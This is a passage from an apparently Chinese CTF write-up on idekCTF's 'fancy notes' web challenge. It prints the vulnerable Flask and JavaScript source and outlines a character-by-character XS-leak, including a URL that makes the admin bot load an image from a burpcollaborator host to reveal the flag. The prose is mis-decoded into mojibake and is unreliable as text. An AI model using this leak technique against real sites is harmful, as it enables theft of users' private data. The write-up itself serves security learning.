&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">try_login&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># åŒ¹é…adminæˆ–flag&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;login.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;login failed!&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/register&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">register&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;register.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">try_register&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;register.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;registration failed!&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/create&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">create&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;admin&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;nah&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;create.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">title&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;title&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">title&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">36&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#75715e"># æ²¡æœ‰SSTI&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;pls no&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">create_note&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">title&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;create.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;note successfully uploaded!&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;create.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;you already have a note with that title!&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/fancy&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">fancify&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;q&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#75715e"># ä¸è®ºget or post&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">any&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">v&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">k&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#39;q&amp;#39;&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">k&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">v&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">items&lt;/span>&lt;span style="color:#111">()])&lt;/span> &lt;span style="color:#75715e"># é•¿åº¦ä¸è¶…è¿‡1&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">results&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">find_note&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;q&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#75715e"># æŸ¥æ‰¾userçš„note qæ˜¯titleæˆ–content&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">results&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">message&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;here is your ð’»ð’¶ð“ƒð’¸ð“Ž note!&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">message&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;no notes found!&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fancy.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">note&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">results&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">message&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fancy.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;bad format! Your style params should not be so long!&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fancy.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/report&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">report&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;report.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Popen&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#d88200">&amp;#39;node&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;bot.js&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">shell&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;report.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;admin visited your url!&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>é™¤äº†app.pyè¿˜æœ‰ä¸€ä¸ªfancify.jsæœ‰ç‚¹ä¸œè¥¿&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">fancify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">note&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">color&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">args&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">style&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">Math&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">floor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Math&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">random&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">)).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">image&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">image&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#d88200">&amp;#39;/static/images/success.png&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// æ”¯æŒä¼ å…¥imageå‚æ•°
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">styleElement&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">note&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">children&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#75af00">styleElement&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">innerHTML&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">style&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// i have no idea why i did this in such a scuffed way but I&amp;#39;m too lazy to change it. no this is not vulnerable
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">note&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">className&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`animation&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">color&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">img&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Image&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">img&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">image&lt;/span>
&lt;span style="color:#75af00">note&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">img&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">Arg&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">search&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">noteElement&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">getElementById&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;note&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">noteElement&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">fancify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">noteElement&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>äº¤äº’è¿‡ç¨‹æ€»ä½“æ˜¯è¿™æ ·çš„ï¼šå¯ä»¥è¾“å…¥å¹¶ä¿å­˜noteï¼Œä¹‹åŽé€‰æ‹©æˆ‘ä»¬çš„noteå°†å…¶fancifyä¹‹åŽæ¸²æŸ“å‡ºæ¥&lt;/p>
&lt;pre tabindex="0">&lt;code>http://fancy-notes.chal.idek.team/fancy?q=Note+1&amp;amp;style=2
&lt;/code>&lt;/pre>&lt;p>å…¶ä¸­é™¤äº†qä»¥å¤–çš„å‚æ•°é•¿åº¦ä¸è¶…è¿‡1ï¼Œå¦‚æžœæ²¡æœ‰æŒ‡å®šimageå¹¶ä¸”noteå­˜åœ¨å°±ä¼šå‡ºçŽ°success.pngçš„å›¾ç‰‡ï¼ŒæŒ‡å®šäº†çš„è¯å°±æ˜¯å¯¹åº”å›¾ç‰‡&lt;/p>
&lt;p>å¦å¤–è¿˜æœ‰ä¸€ä¸ªç»å…¸reportçš„botï¼Œå®ƒä»¥adminèº«ä»½ç™»å…¥åŽå†™å…¥ä¸€æ¡å«æœ‰flagçš„noteï¼Œä¹‹åŽè®¿é—®æˆ‘ä»¬çš„url&lt;/p>
&lt;p>æˆ‘ä¸€å¼€å§‹åœ¨pythonçš„SSTIéƒ¨åˆ†æµªè´¹äº†ä¸€éƒ¨åˆ†æ—¶é—´ï¼Œæƒ³ç€æ˜Žæ˜Žæ²¡æœ‰è¿‡æ»¤ä¸ºä»€ä¹ˆä¸èƒ½æ‰§è¡Œå‘½ä»¤ï¼ŒåŽæ¥æ‰çŸ¥é“è€ƒç‚¹å°±ä¸åœ¨è¿™é‡Œ&lt;/p>
&lt;p>è¿™ä¸ªé¢˜å…¶å®žè·Ÿ[uiuCTF2021]YANAå¾ˆåƒï¼Œä¹Ÿæ˜¯çº¯client-sideå®‰å…¨é—®é¢˜å’Œchar-by-charæ€æƒ³çš„è¿ç”¨ï¼Œè€Œæ›´æ–¹ä¾¿çš„æ˜¯è¿™é‡Œè¿žå›žæ˜¾æ–¹å¼éƒ½ååˆ†æ˜Žç¡®ï¼šå«æœ‰æŒ‡å®šå†…å®¹çš„noteå­˜åœ¨åˆ™æ¸²æŸ“success.png ä¸å­˜åœ¨åˆ™ä¸æ¸²æŸ“ï¼Œå¹¶ä¸”è¿™ä¸ªå›¾ç‰‡æˆ‘ä»¬å¯ä»¥æŒ‡å®šï¼Œé‚£å°†å…¶è®¾ä¸ºæˆ‘ä»¬è‡ªå·±æœåŠ¡å™¨ä¸Šçš„å›¾ç‰‡ï¼Œå¹¶char-by-charçš„ç›²æ³¨æŸ¥è¯¢å­—ç¬¦å°±å¯ä»¥å¾—åˆ°flagçš„å†…å®¹äº†ï¼Œå°±åƒè¿™æ ·&lt;/p>
&lt;pre tabindex="0">&lt;code>http://fancy-notes.chal.idek.team/fancy?q=idekctf{&amp;amp;image=http://5agyjdbu3db0w6e7n60w52wbq2wskh.burpcollaborator.net/
&lt;/code>&lt;/pre>&lt;p>ä¸è¿‡å¹¶æ²¡æœ‰è¿™ä¹ˆè½»æ¾ï¼Œapp.pyä¸­é™åˆ¶äº†é™¤qå‚æ•°ä»¥å¤–çš„å‚æ•°å­—ç¬¦ä¸è¶…è¿‡1ï¼Œå¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿ&lt;/p>
